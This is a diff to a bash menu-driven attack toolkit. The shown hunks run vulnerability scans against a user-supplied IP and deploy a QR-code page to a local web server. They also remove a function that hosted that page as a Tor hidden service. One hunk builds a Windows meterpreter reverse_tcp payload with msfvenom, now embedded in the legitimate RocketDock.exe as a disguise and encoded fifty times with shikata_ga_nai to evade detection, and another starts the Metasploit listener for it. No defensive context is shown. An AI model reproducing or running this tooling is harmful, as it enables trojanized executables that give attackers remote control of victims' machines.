@@ -65,7 +65,7 @@ printf "\e[0m\n"
 read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input IP Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' useripaddress
 whois $useripaddress
 	dig $useripaddress +trace ANY
-	nmap --script vuln -A -sV -sT -O -p- $useripaddress --oN vuln.txt
+	nmap --script vuln -vvv -A -O -p- $useripaddress --oN vuln.txt
         curl -ILk $useripaddress
         curl -Lk $useripaddress/robots.txt
         curl -sI $useripaddress | grep 200 && lynx -listonly -dump $useripaddress | awk '{print $2}' | sort -u | grep -v links: || curl -sI $useripaddress | grep Location | awk '{print $2}' | lynx -listonly -dump - | awk '{print $2}' | sort -u | grep -v links:
@@ -190,14 +190,13 @@ echo "<!DOCTYPE html>
 
 <html>
     <head>
-        <title>Z-HACKER</title>
+        <title>Untitled</title>
         <style type=\"text/css\">
             
             body {
-                background-image: url(\"rapoat.jpg\");
-                background-size: 1000px 1600px;
+                background-image: url("qrcode.png");
+                background-size: 1000px 1000px;
                 background-repeat: no-repeat;
-                background: #000;
             }
 
         </style>
@@ -233,7 +232,7 @@ echo "<!DOCTYPE html>
 </html>" > index.html
 
 mv index.html /var/www/html/index.html
-cp rapoat.jpg /var/www/html/rapoat.jpg
+cp qrcode.png /var/www/html/qrcode.png
 service apache2 start
 echo "         ______________________________________________________   
          7      77  _  77  _  77     77  7  77  7  77  _  77  7   
@@ -476,7 +475,7 @@ read x
 if [ "$x" == "$exe" ]; then                    #EXE
 read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input IP Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' ip
 read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input port Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' port
-msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=$port -e x86/ shikata_ga_nai -i 50 -f exe > test.exe
+msfvenom -x RocketDock.exe -p windows/meterpreter/reverse_tcp lhost=$ip lport=$port --platform windows -e x86/ shikata_ga_nai -i 50 -f exe > test.exe
 echo -e '
 
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -487,7 +486,7 @@ Waiting for listener...
  
 '
 
-msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost 127.0.0.1 ; set lport 4400 ; exploit -j ; jobs ;"
+msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 127.0.0.1; set lport 4400; exploit -j;"
 
 
 elif [ "$x" == "$apk" ]; then                          #APK
@@ -649,20 +648,6 @@ fi
 
 }
 
-hosting(){
-	# ---- nginx ---- #
-	# sudo apt install nginx -y
-	sudo service apache2 stop
-	sudo service nginx restart
-
-	# ---- tor ---- #
-	# sudo apt install tor -y
-	sudo cp torrc /etc/tor/torrc
-	sudo cp index.html /var/www/html/index.html
-	sudo service tor restart
-	cat /var/lib/tor/hidden_service/hostname & 
-	xterm -e tail -f /var/log/nginx/access.log &
-}
 
 banner
 menu
